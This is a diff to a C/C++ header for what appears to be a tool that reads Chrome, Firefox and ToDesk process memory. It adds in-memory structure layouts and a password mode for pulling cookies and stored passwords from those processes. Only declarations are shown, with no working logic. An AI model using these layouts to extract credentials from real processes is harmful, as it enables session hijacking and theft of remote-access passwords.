@@ -6,10 +6,10 @@ enum AppLication {
 	FireFox,
 	ToDesk,
 };
-enum ToDeskMode {
+enum AppMode {
 	Normal,
 	List,
-	ListWithPass
+	Pass
 };
 struct BrowserVersion {
 	WORD highMajor;
@@ -53,15 +53,34 @@ struct Node {
 	OptimizedString key;
 	uintptr_t valueAddress;
 };
+struct PassNode {
+	uintptr_t left;
+	uintptr_t right;
+	uintptr_t parent;
+	bool is_black;
+	char padding[7];
+	uintptr_t valueAddress;
+	char len;
+	char buf[14];
+	unsigned char tag;
+};
+
 
 struct RemoteString {
 	uintptr_t dataAddress;
-	size_t strLen; 
+	size_t strLen;
 	int strMax;
-	char unk[3]; 
-	UCHAR strAlloc; 
+	char unk[3];
+	UCHAR strAlloc;
 };
-
+struct TodeskString {
+	uintptr_t string_part_1;
+	uintptr_t string_part_2;
+	char len;
+	char paddinglen[7];
+	char maxlen;
+	char paddingmaxlen[7];
+};
 
 #pragma region Chrome
 enum class CookieSameSite {
@@ -108,5 +127,5 @@ struct ProcessBoundString {
 	bool encrypted_ = false;
 };
 BOOL GetBrowserVersion(HANDLE hProcess, BrowserVersion& browserVersion);
-void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targetBrowser);
-void WalkRemoteApp(HANDLE hProcess, uintptr_t patternAddress, AppLication targetApplication, ToDeskMode mode);
+void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, AppLication targetBrowser, AppMode mode);
+void WalkRemoteApp(HANDLE hProcess, uintptr_t patternAddress, AppLication targetApplication, AppMode mode);
